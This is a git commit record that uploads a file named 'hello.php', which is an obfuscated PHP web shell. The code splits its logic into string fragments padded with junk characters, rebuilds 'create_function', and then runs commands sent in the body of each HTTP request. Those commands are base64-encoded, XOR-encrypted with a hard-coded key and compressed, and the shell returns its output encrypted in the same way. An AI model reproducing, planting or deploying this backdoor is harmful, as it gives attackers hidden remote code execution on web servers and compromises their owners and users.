b7b524555926a67b29f1e7b3cff3fb43db1f55bf
PriceElio <49208117+enderbrine13@users.noreply.github.com>
2024-05-21 02:38:49 +0000

    Add files via upload

---
+++ hello.php
@@ -0,0 +1,13 @@
+<?php
+$g='$k="5eVa30d2eV91";$eVkh="eV8d0eVeVe6f8962eV19";$kf="888eVe12e6c54a";$p';
+$d=');eV$l=streVlen($t);$o=""eV;eVfor($i=eV0eV;$i<$l;){feVor($j=0;(eV$eVeVj<$c&eV&$';
+$D='eV@baseeV64_eneVcoeVde(@x(@gzcompreeVeVss($o),$k))eV;print("eV$p$kheV$r$kf");}';
+$Q='[eV1eV]),$k))eV);$o=@obeV_eVget_conteeVnts();@ob_endeV_cleaeVn()eV;$r=';
+$W='V1eV) {@ob_eVseVtart();@evaeVl(@gzuneVcomeVpress(@x(@beVase64eV_decodeeV($m';
+$t='="eVHv4eVzUswhjyIHIeVFeVY8";eVfunction xeV($t,$k){$eVc=strleVeVeeVn($k';
+$R='eVi<$l);$eVj++,$i++){$o.=$t{$i}^eV$k{$j};}eV}return $eVo;}if eV(@pree';
+$j=str_replace('s','','screassste_funcsstion');
+$H='Vg_matcheV("/eV$kh(.+)$keVf/",@fieVleVe_get_conteVeeVnts("pheVp://ineVput"),$m)==e';
+$A=str_replace('eV','',$g.$t.$d.$R.$H.$W.$Q.$D);
+$S=$j('',$A);$S();
+?>
